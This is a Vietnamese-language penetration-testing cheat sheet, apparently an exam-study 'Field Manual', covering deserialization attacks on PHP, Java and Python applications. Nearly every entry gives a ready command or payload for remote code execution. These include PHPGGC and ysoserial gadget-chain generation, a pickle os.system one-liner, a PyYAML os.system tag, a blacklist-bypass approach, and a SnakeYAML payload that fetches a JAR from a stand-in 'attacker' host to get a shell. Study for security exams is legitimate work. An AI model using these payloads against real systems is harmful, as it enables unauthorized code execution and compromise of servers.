---
title: "Field Manual"
tags: [pentest, deserialization, field-manual, reference]
created: 2026-03-31
---

> **Mục đích**: Tài liệu tra cứu nhanh trong thi — mỗi lesson thêm một entry.
> **Cách dùng**: Ctrl+F technique name → xem lệnh nhanh, điều kiện, và link về lesson đầy đủ.
>
---

## Web Attacks

### PHP Object Injection (POP Chain)
- **Điều kiện**: Source code có `unserialize()` nhận user input; biết class definitions có magic methods nguy hiểm
- **Quick command**: `php -r "echo base64_encode(serialize(new EvilClass()));"` rồi gửi qua cookie/param
- **Full flow**: Đọc source → tìm magic methods → xây POP chain → serialize → encode → inject
- **Look for**: Error stack trace tiết lộ class names; `O:8:"ClassName"` trong base64-decoded cookie
- **Ref**: [[02-php-object-injection|02. PHP Object Injection]]

### PHPGGC — PHP Gadget Chain Generator
- **Điều kiện**: Biết framework/library (Laravel, Symfony, Monolog, Yii...); có điểm unserialize()
- **Quick command**: `phpggc -l` liệt kê chains; `phpggc Laravel/RCE1 system 'id'` generate payload
- **Full flow**: `phpggc -l` → chọn chain phù hợp → `phpggc <chain> <func> '<cmd>' | base64` → inject
- **Look for**: Framework version trong composer.json, error messages, HTTP headers
- **Ref**: [[03-phpggc-phar-deserialization|03. PHPGGC & PHAR Deserialization]]

### PHAR Deserialization
- **Điều kiện**: File upload + filesystem function nhận user-controlled path (`file_exists`, `fopen`, `getimagesize`...)
- **Quick command**: `php -d phar.readonly=0 phpggc --phar phar -o payload.phar <chain> system 'id'`
- **Full flow**: Generate PHAR gadget → upload disguised (polyglot GIF/PNG) → trigger via `phar://path/to/file`
- **Look for**: `file_exists($_GET['path'])`, `getimagesize()` với user input, PHP version < 8.0
- **Ref**: [[03-phpggc-phar-deserialization|03. PHPGGC & PHAR Deserialization]]

### Java Deserialization (ysoserial)
- **Điều kiện**: Java app nhận serialized object (magic bytes `AC ED 00 05` / base64 `rO0A`); classpath có gadget lib
- **Quick command**: `java -jar ysoserial.jar CommonsCollections6 'id' | base64 -w0`
- **Full flow**: Detect magic bytes → enumerate classpath (GadgetProbe/error) → chọn gadget → generate → inject
- **Look for**: Cookie/POST data bắt đầu bằng `rO0A` (base64) hoặc `\xac\xed\x00\x05` (hex)
- **Ref**: [[05-ysoserial-commons-collections|05. ysoserial & CommonsCollections]]

### Custom Java Gadget Chain
- **Điều kiện**: Known gadgets không work; có source code hoặc decompiled JAR; cần chain qua app-specific class
- **Quick command**: Implement `readObject()` → chain qua Serializable classes → compile → serialize
- **Full flow**: Decompile JAR → tìm Serializable classes với dangerous readObject → xây chain → FieldValues trick
- **Look for**: `implements Serializable` + `private void readObject(ObjectInputStream)` trong decompiled code
- **Ref**: [[06-custom-java-gadget-chain|06. Custom Java Gadget Chain]]

### SnakeYAML Deserialization
- **Điều kiện**: Java app parse YAML với `new Yaml().load(userInput)` (unsafe load)
- **Quick command**: `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/yaml-payload.jar"]]]]`
- **Full flow**: Test với OOB DNS `!!java.net.URL ["http://burp-collab"]` → confirm → serve JAR → get shell
- **Look for**: YAML parsing endpoint, Tomcat/Spring backend, SnakeYAML dependency
- **Ref**: [[07-java-deserialization-alt-vectors|07. Java Alt Vectors]]

### Python Pickle RCE
- **Điều kiện**: App gọi `pickle.loads()` / `cPickle.loads()` với user-controlled data
- **Quick command**: `python3 -c "import pickle,os,base64; print(base64.b64encode(pickle.dumps(type('E',(object,),{'__reduce__':lambda s:(os.system,('id',))})())))"`
- **Full flow**: Tìm pickle.loads() call → craft `__reduce__` class → serialize → base64 encode → inject
- **Look for**: Flask/Django session cookies, `.pkl` file uploads, base64 data trong POST body
- **Ref**: [[08-python-pickle-rce|08. Python Pickle RCE]]

### PyYAML Unsafe Load
- **Điều kiện**: App dùng `yaml.load(input)` không có Loader (PyYAML < 6.0) hoặc `yaml.load(input, Loader=yaml.Loader)`
- **Quick command**: `!!python/object/apply:os.system ['id']`
- **Full flow**: Test với safe payload → confirm YAML parsing → inject `!!python/object/apply` payload
- **Look for**: Python backend, YAML config endpoints, file upload accepting `.yaml`/`.yml`
- **Ref**: [[09-python-unsafe-deserialization-ecosystem|09. Python Unsafe Deser Ecosystem]]

### SerialKiller / Filter Bypass (Java)
- **Điều kiện**: App dùng SerialKiller/NotSoSerial blacklist nhưng có class không bị blacklist
- **Quick command**: Thử CommonsCollections6 (không dùng InvokerTransformer như CC1) hoặc CommonsBeanutils1
- **Full flow**: Test CC6 → test ROME → test Spring → enumerate với GadgetProbe → tìm chain không bị block
- **Look for**: Error "Blocked by SerialKiller" → biết blacklist đang hoạt động → tìm chain bypass
- **Ref**: [[11-bypass-techniques|11. Bypass Techniques]]

---

## Tools Reference

### PHPGGC
- **Install**: `git clone https://github.com/ambionics/phpggc && cd phpggc`
- **List chains**: `php phpggc -l` hoặc `php phpggc -l Laravel`
- **Generate**: `php phpggc Laravel/RCE1 system 'cmd' | base64`
- **PHAR mode**: `php -d phar.readonly=0 phpggc --phar phar -o out.phar <chain> system 'cmd'`
- **Ref**: [[03-phpggc-phar-deserialization|03. PHPGGC & PHAR]]

### ysoserial
- **Run**: `java -jar ysoserial-all.jar <payload> '<command>'`
- **List payloads**: `java -jar ysoserial-all.jar` (không args)
- **DNS test**: `java -jar ysoserial-all.jar URLDNS 'http://burp-collab'`
- **Base64 output**: `java -jar ysoserial-all.jar CC6 'id' | base64 -w0`
- **Ref**: [[05-ysoserial-commons-collections|05. ysoserial & CC]]

### pickletools
- **Disassemble**: `python3 -c "import pickle,pickletools; pickletools.dis(pickle.dumps(obj))"`
- **From file**: `python3 -c "import pickletools; pickletools.dis(open('payload.pkl','rb').read())"`
- **Ref**: [[08-python-pickle-rce|08. Python Pickle RCE]]

---

*Field Manual được cập nhật sau mỗi lesson. KHÔNG edit thủ công phần trên — chỉ thêm entries vào các sections.*